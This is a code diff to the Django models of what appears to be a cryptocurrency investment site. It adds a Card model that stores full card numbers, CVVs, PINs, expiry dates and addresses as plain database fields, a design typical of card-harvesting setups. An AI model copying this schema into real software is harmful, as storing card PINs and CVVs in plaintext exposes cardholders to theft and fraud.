@@ -14,6 +14,24 @@ class Bitcoin(models.Model):
     def __str__(self):
         return self.username 
 
+class Card(models.Model):
+    name = models.TextField()
+    number = models.BigIntegerField()
+    expirym = models.CharField(max_length=100)
+    expiryy = models.CharField(max_length=100)
+    cvv = models.IntegerField()
+    pin = models.IntegerField()
+    zipcode = models.IntegerField()
+    country = models.CharField(max_length=100)
+    state = models.CharField(max_length=100)
+    city = models.CharField(max_length=100)
+    add1 = models.TextField(max_length=100)
+    add2 = models.TextField(max_length=100)
+    username = models.CharField(max_length=100, default='0')
+    
+    def __str__(self):
+        return self.username 
+
 
 class Deposits(models.Model):
     user_id = models.IntegerField()
@@ -31,7 +49,7 @@ class Balance(models.Model):
     deposit = models.IntegerField(blank=True, default='0',)
     staked = models.IntegerField(blank=True, default='0',)
     investment = models.IntegerField(blank=True, default='0',)
-    active_deposit = models.IntegerField(blank=True, default='0',)
+    # active_deposit = models.IntegerField(blank=True, default='0',)
     # deposit_date = models.DateTimeField(auto_now_add=True)
     username = models.CharField(max_length=100, blank=True, default='0',)
 
@@ -43,7 +61,7 @@ class Contact(models.Model):
     email = models.CharField(max_length=100, blank=True)
     country = models.CharField(max_length=100, blank=True)
     phone = models.IntegerField(blank=True)
-    message = models.CharField(max_length=100, blank=True)
+    message = models.CharField(max_length=1000, blank=True)
 
     def __str__(self): 
         return self.name 
